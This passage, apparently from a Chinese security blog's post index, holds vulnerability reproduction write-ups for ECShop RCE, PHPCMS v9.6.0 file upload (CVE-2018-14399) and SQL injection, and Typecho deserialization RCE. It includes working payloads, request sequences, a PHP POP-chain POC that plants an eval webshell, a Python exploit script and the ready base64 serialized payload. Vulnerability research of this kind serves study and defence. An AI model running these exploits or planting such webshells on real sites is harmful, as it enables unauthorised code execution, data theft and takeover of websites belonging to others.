p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop360`.`ecs_ad` AS a LEFT JOIN `ecshop360`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time &lt;= &apos;1606229787&apos; AND end_time &gt;= &apos;1606229787&apos; AND a.position_id = &apos;1&apos; and updatexml(1,make_set(3,&apos;~&apos;,(select version())),1)#&apos; ORDER BY rnd LIMIT 669 RCE回顾 /includes/lib_insert.php#insert_ads function insert_ads($arr){ static $static_res = NULL; $time = gmtime(); if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1) { $sql = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; . &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; . &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;. &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; . &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;. &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; . &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;]; $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql); } $ads = array(); $position_style = &apos;&apos;; foreach ($res AS $row) { if ($row[&apos;position_id&apos;] != $arr[&apos;id&apos;]) { continue; } ········ $position_style = &apos;str:&apos; . $position_style; $need_cache = $GLOBALS[&apos;smarty&apos;]-&gt;caching; $GLOBALS[&apos;smarty&apos;]-&gt;caching = false; $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads); $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style); $GLOBALS[&apos;smarty&apos;]-&gt;caching = $need_cache; return $val;} 在这一步关键的附值，$row[&apos;position_style&apos;] 来自$res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql) 查询后 foreach 遍历的结果。有几个关注的点： 首先关注 $position_style 这个变量 关注 $row[&apos;position_id&apos;] != $arr[&apos;id&apos;] （相等调用 $position_style = $row[&apos;position_style&apos;];） 在下面完成拼接 会调用 fetch /includes/cls_template.php 145 行是一个关键点。无非两个函数： fetch_str _eval 肯定首先得 fetch_str 处理截断后的 filename ，也就是{$asd&apos;];phpinfo\\t();//}xxx 后面经过一顿操作，各种替换之后，原来的值变成了 $asd&apos;];phpinfo\\t();// 进入 select 函数，关键点如下。返回值是直接 php echo 出来的 后面的过程在第一次分析的时候是懵逼的，其实是缺乏了对前面 SQL 语句的大局观，而且流程很杂，各种 replace 的替换和各种 if。 @badcode 从宏观上总结的 SQL 语句和最后 position_style 的关系已经很简洁了。我这里不再复述 接下来就是把构造好的代码通过SQL注入漏洞传给$position_style。 这里可以用union select 来控制查询的结果，根据之前的流程，$row[&apos;position_id&apos;]和$arr[&apos;id&apos;]要相等，$row[&apos;position_id&apos;]是第二列的结果，$position_style是第九列的结果。$arr[&apos;id&apos;]传入&apos; /*,$arr[&apos;num&apos;]传入*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -，0x27202f2a是&apos; /*的16进制值，也就是$row[&apos;position_id&apos;]的值，0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d是上面构造的php代码的16进制值，也就是$position_style。 get_var 中会调用 make_var，最后返回值 论 $position_style 的演变 {$asd&apos;];phpinfo\\t();//}xxx$res = $static_res[$arr[&apos;id&apos;]]; -&gt; foreach ($res AS $row) -&gt; $position_style = $row[&apos;position_style&apos;];str:{$asd&apos;];phpinfo\\t();//}xxx$position_style = &apos;str:&apos; . $position_style; $asd&apos;];phpinfo\\t();//}xxxreturn preg_replace_callback(&quot;/{([^\\}\\{\\n]*)}/&quot;, function($r) use(&amp;$template){return $template-&gt;select($r[1]);}, $source);asd&apos;];phpinfo\\t();//elseif ($tag{0} == &apos;$&apos;){return &apos;&lt;?php echo &apos; . $this-&gt;get_val(substr($tag, 1)) . &apos;; ?&gt;&apos;;} $this-&gt;_var[&apos;asd&apos;];phpinfo\\t();//&apos;]foreach ($t AS $val) { $p.= &apos;[\\&apos;&apos; . $val . &apos;\\&apos;]&apos;; } 最后输出 phpinfo() 4.0 SQLi没找到安装包233333…先咕咕咕了～～～ https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw http://foreversong.cn/archives/1556 参考链接https://paper.seebug.org/695/","link":"/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"title":"PHPCMS v9.6.0 两个漏洞分析","text":"任意文件上传（CVE-2018-14399） + wap模块 SQL注入 任意文件上传（CVE-2018-14399）漏洞复现漏洞危害：该漏洞可以在用户注册界面以未授权的情况下实现任意文件上传。 漏洞触发位置在 会员注册 这个界面。地址为 ip/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 POST参数如下 siteid=1&amp;modelid=11&amp;username=P2hm1n&amp;password=P2hm1n&amp;email=123456@qq.com&amp;info[content]=&lt;img src=你的shell&gt;&amp;dosubmit=1&amp;protocol= 访问爆出上传地址 能shell 漏洞分析文件目录 phpcms/modules/member/index.php index.php 大致实现功能：会员前台管理中心、账号管理、收藏操作类 触发漏洞点方法是 register 大致逻辑是 获取用户siteid，定义站点id常量，加载用户模块配置，加载短信模块配置 第 134-135 行 发现可控变量 $_POST[‘info’] 经过漏洞复现我们可以知道这是 exp 的关键参数 先看 134 行的处理，将 $_POST[‘info’] 这个参数经过了new_html_special_chars这个函数过滤。跟进函数分析 /** * 返回经addslashe处理过的字符串或数组 * @param $obj 需要处理的字符串或数组 * @return mixed */function new_html_special_chars($string) { $encoding = &apos;utf-8&apos;; if(strtolower(CHARSET)==&apos;gbk&apos;) $encoding = &apos;gb2312&apos;; if(!is_array($string)) return htmlspecialchars($string,ENT_COMPAT,$encoding); foreach($string as $key =&gt; $val) $string[$key] = new_html_special_chars($val); return $string;} 主要功能是做了 html 转义。对我们漏洞利用没有太大阻碍。接着跟进一下 135行的 $member_input-&gt;get() 方法 方法位置：caches/caches_model/caches_data/member_input.class.php function get($data) { $this-&gt;data = $data = trim_script($data); $model_cache = getcache(&apos;member_model&apos;, &apos;commons&apos;); $this-&gt;db-&gt;table_name = $this-&gt;db_pre.$model_cache[$this-&gt;modelid][&apos;tablename&apos;]; $info = array(); $debar_filed = array(&apos;catid&apos;,&apos;title&apos;,&apos;style&apos;,&apos;thumb&apos;,&apos;status&apos;,&apos;islink&apos;,&apos;description&apos;); if(is_array($data)) { foreach($data as $field=&gt;$value) { if($data[&apos;islink&apos;]==1 &amp;&amp; !in_array($field,$debar_filed)) continue; $field = safe_replace($field); $name = $this-&gt;fields[$field][&apos;name&apos;]; $minlength = $this-&gt;fields[$field][&apos;minlength&apos;]; $maxlength = $this-&gt;fields[$field][&apos;maxlength&apos;]; $pattern = $this-&gt;fields[$field][&apos;pattern&apos;]; $errortips = $this-&gt;fields[$field][&apos;errortips&apos;]; if(empty($errortips)) $errortips = &quot;$name 不符合要求！&quot;; $length = empty($value) ? 0 : strlen($value); if($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(&quot;$name 不得少于 $minlength 个字符！&quot;); if (!array_key_exists($field, $this-&gt;fields)) showmessage(&apos;模型中不存在&apos;.$field.&apos;字段&apos;); if($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) { showmessage(&quot;$name 不得超过 $maxlength 个字符！&quot;); } else { str_cut($value, $maxlength); } if($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips); if($this-&gt;fields[$field][&apos;isunique&apos;] &amp;&amp; $this-&gt;db-&gt;get_one(array($field=&gt;$value),$field) &amp;&amp; ROUTE_A != &apos;edit&apos;) showmessage(&quot;$name 的值不得重复！&quot;); $func = $this-&gt;fields[$field][&apos;formtype&apos;]; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); $info[$field] = $value; } } return $info;} 首先将 data 经过一个 trim_script 的处理。但是 trim_script 大多都是处理 xss 有关漏洞的过滤。几个正则将xss的关键 payload 进行了替换 第27行，核心 if 判断条件 if(is_array($data)) 。我们 payload 中 info[content]=&lt;img src=你的shell&gt; 就是一个数组。因此继续跟进，发现将数组进行遍历，键名为$field，键值为$value 第30行，$field 进行一次 safe_replace 处理。主要过滤一些类似单引号，尖括号等可能产生 XSS，SQL注入的符号 之后经过一些注册时正常的判断逻辑代码 47-48行 $func = $this-&gt;fields[$field][&apos;formtype&apos;];if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); 先是定义了一个 $func ，然后下面的if语句判断方法如果存在就带入这个函数。 挨个查看方法中，在 editor 方法中 的一句话。调用了 attachment 类的 download 函数 $value = $this-&gt;attachment-&gt;download(&apos;content&apos;, $value,$watermark_enable); 跟进文件 phpcms/libs/classes/attachment.class.php /** * 附件下载 * Enter description here ... * @param $field 预留字段 * @param $value 传入下载内容 * @param $watermark 是否加入水印 * @param $ext 下载扩展名 * @param $absurl 绝对路径 * @param $basehref */ function download($field, $value,$watermark = &apos;0&apos;,$ext = &apos;gif|jpg|jpeg|bmp|png&apos;, $absurl = &apos;&apos;, $basehref = &apos;&apos;) { global $image_d; $this-&gt;att_db = pc_base::load_model(&apos;attachment_model&apos;); $upload_url = pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;); $this-&gt;field = $field; $dir = date(&apos;Y/md/&apos;); $uploadpath = $upload_url.$dir; $uploaddir = $this-&gt;upload_root.$dir; $string = new_stripslashes($value); if(!preg_match_all(&quot;/(href|src)=([\\&quot;|&apos;]?)([^ \\&quot;&apos;&gt;]+\\.($ext))\\\\2/i&quot;, $string, $matches)) return $value; $remotefileurls = array(); foreach($matches[3] as $matche) { if(strpos($matche, &apos;://&apos;) === false) continue; dir_create($uploaddir); $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref); } unset($matches, $string); $remotefileurls = array_unique($remotefileurls); $oldpath = $newpath = array(); foreach($remotefileurls as $k=&gt;$file) { if(strpos($file, &apos;://&apos;) === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file); $file_name = basename($file); $filename = $this-&gt;getname($filename); $newfile = $uploaddir.$filename; $upload_func = $this-&gt;upload_func; if($upload_func($file, $newfile)) { $oldpath[] = $k; $GLOBALS[&apos;downloadfiles&apos;][] = $newpath[] = $uploadpath.$filename; @chmod($newfile, 0777); $fileext = fileext($filename); if($watermark){ watermark($newfile, $newfile,$this-&gt;siteid); } $filepath = $dir.$filename; $downloadedfile = array(&apos;filename&apos;=&gt;$filename, &apos;filepath&apos;=&gt;$filepath, &apos;filesize&apos;=&gt;filesize($newfile), &apos;fileext&apos;=&gt;$fileext); $aid = $this-&gt;add($downloadedfile); $this-&gt;downloadedfiles[$aid] = $filepath; } } return str_replace($oldpath, $newpath, $value); } 首先限制了其中 $ext 只允许为gif|jpg|jpeg|bmp|png 153行 进行了一个过滤 if(!preg_match_all(&quot;/(href|src)=([\\&quot;|&apos;]?)([^ \\&quot;&apos;&gt;]+\\.($ext))\\\\2/i&quot;, $string, $matches)) return $value; 这里匹配了src或href中文件的文件名，不过后缀为$ext，其中$ext的值为：gif|jpg|jpeg|bmp|png http://ip/p2hm1n.php#a.jpg 即可绕过正则 158行 使用了 fillurl 函数远程加载资源，还吧 # 之后的字符全部移除 $pos = strpos($surl,&apos;#&apos;);if($pos&gt;0) $surl = substr($surl,0,$pos); P2hm1n.php#a.jpg 会被处理成 P2hm1n.php 之后调用 download 方法。程序直接调用 copy 函数将远程文件复制到本地 wap模块 SQL注入漏洞复现访问 http://phpcms/index.php?m=wap&amp;a=index&amp;siteid=1 PS: 默认安装是不具备war模块的，跟进后台看了一下，好像跟手机门户网站有关，但其实并不影响漏洞的利用 直接发包至 repeater 模块。 将返回的 Set-Cookie 中TVAUD_siteid值附值给 userid_flash变量因此 userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY 访问 http://localhost/phpcms/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26 并 POST 传参 userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY 将返回的 Set-Cookie 中TVAUD_att_json值附值给 a_k参数 GET型访问 http://phpcms/index.php?m=content&amp;c=down&amp;a_k=4639DgUMpurTOZjooOJq4TX6Y0Q_XVqujouwKcrfLTvAEJjgOjGhm4VLN5AZ3CQkIcSOFCoDh8V7NVmGuVvN6hrYV59KmsRC0SO-V_b6hLXhJxDw4DuOEQ1KS2RPKSae8keEN8PbbTo7fICqQnhDpFhUN5JSRgScbgnQggVE7d56earVmPST9Lw 漏洞分析漏洞触发点在 phpcms/modules/content/down.php 的 init() 函数12 行 GET方式传入 a_k参数14 行 根据 DECODE 判断其 sys_auth 为一个解密函数。直接证明——》a_k参数之前是经过加密的。这个解密流程其实很长，我们其实不用去看它的一个解密流程。17 行 使用 parse_str() 函数处理 。 parse_str() 函数会自动对传入的值将其根据&amp;分割，然后解析到具体变量并注册变量，并且对内容进行URL解码操作。26 行 引用未注册变量 array(‘id’=&gt;$id) ，但这里的id可以从parse_str函数处理$a_k后得到。且调用 get_one 方法。 get_one方法定义点在 /phpcms/libs/classes/model.class.php 73-76行。跟进发现这里的 get_one 方法其实就是 SQL 查询。且用到了 sqls 方法。跟进 sqls 方法，这里是对数组参数的一个处理过程。且从头到位都没有对$id 参数进行过滤处理。因此存在 sql 注入漏洞 现在我们根据 从parse_str函数处理$a_k后得到的 id 推断出了存在 sql注入。但是由于之前我们推断中忽略的是一个解密流程。因此其实我们需要找到带有 sql注入payload 经过一次加密之后的 payload。 核心目的：构造加密后的 $a_k 变量 思路一：伪造加密过程：直接对应源码中加密代码，进行本地加解密。产生问题：源码中对应的 auth_key 值来自服务器。且每个站点这个 auth_key 可能不一样。 思路二：寻找源码中调用此加密的地方。且可回显加密后代码方法： 全局搜索 sys_auth 。phpcms\\libs\\classes\\param.class.php 中存在 set_cookie 方法寻找哪里没有过滤sql注入的传入点。且可通过 cookie 加密获得加密后 payload关键点：phpcms/modules/attachment/attachments.php 的 swfupload_json 方法。 public function swfupload_json() { $arr[&apos;aid&apos;] = intval($_GET[&apos;aid&apos;]); $arr[&apos;src&apos;] = safe_replace(trim($_GET[&apos;src&apos;])); $arr[&apos;filename&apos;] = urlencode(safe_replace($_GET[&apos;filename&apos;])); $json_str = json_encode($arr); $att_arr_exist = param::get_cookie(&apos;att_json&apos;); $att_arr_exist_tmp = explode(&apos;||&apos;, $att_arr_exist); if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) { return true; } else { $json_str = $att_arr_exist ? $att_arr_exist.&apos;||&apos;.$json_str : $json_str; param::set_cookie(&apos;att_json&apos;,$json_str); return true; }} 通过 GET 传入三个参数，第一个参数 aid 经过了 intval 函数处理，那么不太适合通过此处传入payload。第二个参数 src 经过了 safe_replace处理。第三个 filename 通过 safe_replace 和 一次url 编码处理。之后做 json_encode 的操作，最终再调用 set_cookie 方法。跟进一下 safe_replace 方法，发现是通过 str_replace 进行处理，且没有通过循环遍历来过滤，它只执行一次。那么两两组合一下，然后替换，从而达到 bypass 的效果。 但是在触发 set_cookie 的 swfupload_json 方法，之前有一定的条件。在phpcms/modules/attachment/attachments.php第十行的 attachments 类。其中 __construct 方法，相当于做类的初始化工作。其中有用户登录状态检测。21行限制 $this→userid 不能为空，否则跳转到登录界面17 行 程序并没有检查 $this-&gt;userid 的有效性，所以只要传入的 userid_flash 是加密值就能够解密就可以通过检测。获取 userid_flash加密值：在phpcms/modules/wap/index.php 文件。通过 cookie 获取 $_GET[‘siteid’] 加密后的数据，然后再作为 $_POST[‘userid_flash’] 的值，即可绕过登录检测。 参考文章 https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/https://www.hackersb.cn/hacker/219.htmlhttps://www.freebuf.com/articles/web/202914.htmlhttp://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/","link":"/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"Typecho 反序列化漏洞分析","text":"Typecho 反序列化漏洞分析和一些坑点 漏洞概述 Typecho是一个简单，轻巧的博客程序。基于PHP，使用多种数据库（Mysql，PostgreSQL，SQLite）储存数据。在GPL Version 2许可证下发行，是一个开源的程序，目前使用SVN来做版本管理。 触发点在 ./install.php 。是一个反序列化导致的任意代码执行，从而实现前台 getshell。 受影响版本：GitHub上2017年10月24日之前的所有版本。 漏洞分析漏洞触发点在 ./install.php。定位敏感函数 unserialize。这里其实定位到了两个有关利用点，但是其实只有第一处能够利用。相关代码在 231-237行 &lt;?php$config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));Typecho_Cookie::delete(&apos;__typecho_config&apos;);$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);Typecho_Db::set($db);寻找unserialize函数中变量是否可控。可见先经过一次 base64_decode 函数解码，然后调用的是 Typecho_Cookie 类下的get方法。 public static function get($key, $default = NULL){ $key = self::$_prefix . $key; $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default); return is_array($value) ? $default : $value;} 关键点在 value 附值处。可见设定了两个三元运算符进行嵌套, 通过 $_COOKIE 和 $_POST 对其附值。可见这里我们可以直接通过 POST 方法来控制 key 的变量，从而控制 value 。 现在我们已经拥有了反序列化的点(unserialize),和我们的可控变量（$_POST 对__typecho_config 附值）。 思考：我们通过反序列化得到了什么？——》 $config变量的可控性。 紧接着体现 $config 变量可控性的地方在 $db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);。 程序通过 Typecho_Db 进行了实例化。跟进方法 &lt;?phpclass Typecho_Db{ public function __construct($adapterName, $prefix = &apos;typecho_&apos;) { /** 获取适配器名称 */ $this-&gt;_adapterName = $adapterName; /** 数据库适配器 */ $adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName; if (!call_user_func(array($adapterName, &apos;isAvailable&apos;))) { throw new Typecho_Db_Exception(&quot;Adapter {$adapterName} is not available&quot;); } $this-&gt;_prefix = $prefix; /** 初始化内部变量 */ $this-&gt;_pool = array(); $this-&gt;_connectedPool = array(); $this-&gt;_config = array(); //实例化适配器对象 $this-&gt;_adapter = new $adapterName(); }} 关键代码为 $adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName;， 这里进行了一个字符串的拼接。且 adapterName 是我们可控的。如果我们传入一个类，PHP就会做一个从类到字符串的强制类型转换。由此会触发那个类的 toString 方法。 我们目前的利用链为: install.php 反序列化导致$config 变量可控 ——&gt; Cookie.php 中.拼接导致强制类型转换触发传入类 __tostring 方法。 接着我们就开始寻找我们可利用的 tostring 方法。一共三处，我们可以利用的只有 var/Typecho/Feed.php 一处。截取部分代码 class Typecho_Feed{ private $_items = array(); /** * $item的格式为 * &lt;code&gt; * array ( * &apos;title&apos; =&gt; &apos;xxx&apos;, * &apos;content&apos; =&gt; &apos;xxx&apos;, * &apos;excerpt&apos; =&gt; &apos;xxx&apos;, * &apos;date&apos; =&gt; &apos;xxx&apos;, * &apos;link&apos; =&gt; &apos;xxx&apos;, * &apos;author&apos; =&gt; &apos;xxx&apos;, * &apos;comments&apos; =&gt; &apos;xxx&apos;, * &apos;commentsUrl&apos;=&gt; &apos;xxx&apos;, * &apos;commentsFeedUrl&apos; =&gt; &apos;xxx&apos;, * ) * &lt;/code&gt; * * @access public * @param array $item * @return unknown */ public function addItem(array $item) { $this-&gt;_items[] = $item; } # ~ ~ ~ ~ ~ ~ 省略部分代码 foreach ($this-&gt;_items as $item) { $content .= &apos;&lt;item&gt;&apos; . self::EOL; $content .= &apos;&lt;title&gt;&apos; . htmlspecialchars($item[&apos;title&apos;]) . &apos;&lt;/title&gt;&apos; . self::EOL; $content .= &apos;&lt;link&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/link&gt;&apos; . self::EOL; $content .= &apos;&lt;guid&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/guid&gt;&apos; . self::EOL; $content .= &apos;&lt;pubDate&gt;&apos; . $this-&gt;dateFormat($item[&apos;date&apos;]) . &apos;&lt;/pubDate&gt;&apos; . self::EOL; $content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL; 关键点在 290行， $content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL; ，这里我们可控 $item[&apos;author&apos;]。当他被设置一个类，且从不可访问的属性screenName读取数据时，会调用 __get 方法。 我们目前的利用链为: install.php 反序列化导致$config 变量可控 ——&gt; Cookie.php 中.拼接导致强制类型转换触发传入类 __tostring 方法。——&gt; Feed.php 中控制 $item[&apos;author&apos;] 去触发传入类的 __get 方法。 接着我们开始寻找 __get 方法。找到我们可以利用的文件 Request.php class Typecho_Request{ public function __get($key) { return $this-&gt;get($key); }}跟进里面调用的 get 函数 class Typecho_Request{ public function get($key, $default = NULL) { switch (true) { case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset(self::$_httpParams[$key]): $value = self::$_httpParams[$key]; break; default: $value = $default; break; } $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_applyFilter($value); } 最后 return 返回值经过了 _applyFilter 处理，跟进 _applyFilter class Typecho_Request{ private function _applyFilter($value) { if ($this-&gt;_filter) { foreach ($this-&gt;_filter as $filter) { $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); } $this-&gt;_filter = array(); }发现敏感函数: call_user_func 。且 $filter通过 private $_filter = array(); + foreach ($this-&gt;_filter as $filter) 得到，$filter可控。$value 通过 _params[$key]间接得到，所以也是可控的。 由此完成了我们的POP链 但在到达反序列化利用点（unserialize函数）之前，代码进行了两个限制。大概功能在注释中也写的清楚明了了。 //判断是否已经安装if (!isset($_GET[&apos;finish&apos;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &apos;/config.inc.php&apos;) &amp;&amp; empty($_SESSION[&apos;typecho&apos;])) { exit;}// 挡掉可能的跨站请求if (!empty($_GET) || !empty($_POST)) { if (empty($_SERVER[&apos;HTTP_REFERER&apos;])) { exit; } $parts = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]); if (!empty($parts[&apos;port&apos;])) { $parts[&apos;host&apos;] = &quot;{$parts[&apos;host&apos;]}:{$parts[&apos;port&apos;]}&quot;; } if (empty($parts[&apos;host&apos;]) || $_SERVER[&apos;HTTP_HOST&apos;] != $parts[&apos;host&apos;]) { exit; }}针对第一点: 通过GET传参 finish 就能绕过； 针对第二点： refer来自本站即可 最后有一个坑来自于 install.php 最开头的 ob_start();。 @LoRexxar师傅提到 因为我们上面对象注入的代码触发了原本的exception，导致ob_end_clean()执行，原本的输出会在缓冲区被清理。 我们必须想一个办法强制退出，使得代码不会执行到exception，这样原本的缓冲区数据就会被输出出来。 这里有两个办法。 1、因为call_user_func函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。 2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。 同时 @pupiles 师傅也在blog中指出，由于调用了ob_end_clean方法清空了缓冲区。导致没有回显，但是php还是可以成功执行的，可以直接通过 file_put_contents 写入shell 解决了这个问题，整个利用ROP链就成立了 最终POP链为:install.php 中的 unserialize反序列化可控 $config 值导致的 $config[&apos;adapter&apos;]可控。——》Db.php 中进行PHP类型强制转换，触发 $config[&apos;adapter&apos;]可控类的 __tostring 方法——》Feed.php 中 __tostring 方法内调用可控制类从不可访问的属性读取数据$item[&apos;author&apos;]-&gt;screenName) 触发 __get方法——》Request.php 中 __get方法调用 get 方法，调用 _applyFilter方法中 的 call_user_func，控制其内两个参数实现命令执行 其实光看POP链不怎么复杂，但是里面每一步构造，每一个方法的尝试调用都是要经过很多次的跟进和分析的。 编写 POC &amp; EXP顺着 @pupiles 师傅 bypass ob_start() 的思路写的POC。但是使用 @pupiles 师傅blog中的 POC 可能有一点小问题。由于PHP中双引号具有解析效果，这里的 POST 会被解析，最终写入的 webshell 的代码为 &lt;?php @eval()?&gt; 因此改良POC如下 &lt;?php//编写最后 call_user_func 函数利用的类class Typecho_Request{ private $_filter = array(); private $_params = array(); public function __construct(){ $this-&gt;_filter[0] = &apos;assert&apos;; //采用传统回调利用，call_user_func + assert $this-&gt;_params[&apos;screenName&apos;] = &apos;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\\$_POST[P2hm1n]); ?&gt;&quot;)&apos;; //bypass ob_start()限制 }}class Typecho_Feed{ const RSS2 = &apos;RSS 2.0&apos;; private $_type; private $_items = array(); public function __construct(){ $this-&gt;_type = self::RSS2; $this-&gt;_items[0] = array( &apos;author&apos; =&gt; new Typecho_Request(), ); }}$final = new Typecho_Feed();$poc = array( &apos;adapter&apos; =&gt; $final, &apos;prefix&apos; =&gt; &apos;typecho_&apos;);echo urlencode(base64_encode(serialize($poc)));?&gt; 还有一种办法就是利用造成一个报错来构造POC。核心代码如下 public function __construct(){ $this-&gt;_type = $this::RSS2; $this-&gt;_items[0] = array( &apos;category&apos; =&gt; array(new Typecho_Request()), &apos;author&apos; =&gt; new Typecho_Request(), ); } 最后简单的exp编写如下，没有对url做细致的处理。异常处理也不够细致。 import requestsurl = &apos;http://typecho/&apos;def exp(url): if &quot;http//&quot; or &quot;https://&quot; in url: url = url else: url = &apos;http://&apos; + url target = url + &apos;/install.php?finish&apos; fakerefer = url + &apos;/install.php&apos; payload = &apos;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtQMmhtMW5dKTsgPz4iKSI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D&apos; headers = { &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&apos;, &apos;Referer&apos;: fakerefer, &apos;cookie&apos;: payload } try: html = requests.get(url=target, headers=headers, timeout=5) if html.status_code == 404: return &apos;no install.php&apos; else: print(&apos;mkdir:./shell.php, shell_password=P2hm1n&apos;) except: print(&apos;something wrong&apos;)if __name__ == &apos;__main__&apos;: exp(url) 漏洞复现首先正常安装 typecho，本地环境 MacOS + MAMP PRO(PHP7.3.9+Mysql5.7) 安装过程中需要自己去数据库里新建一个空数据库，安装过程并不会帮助你新建一个空的数据库然后写入数据。 访问 url 为 http://typecho/install.php?finish。 refer设置根据自身情况改变 POST参数如下__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtQMmhtMW5dKTsgPz4iKSI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D 即可在当前目录下生成 shell.php 文件，密码为 P2hm1n 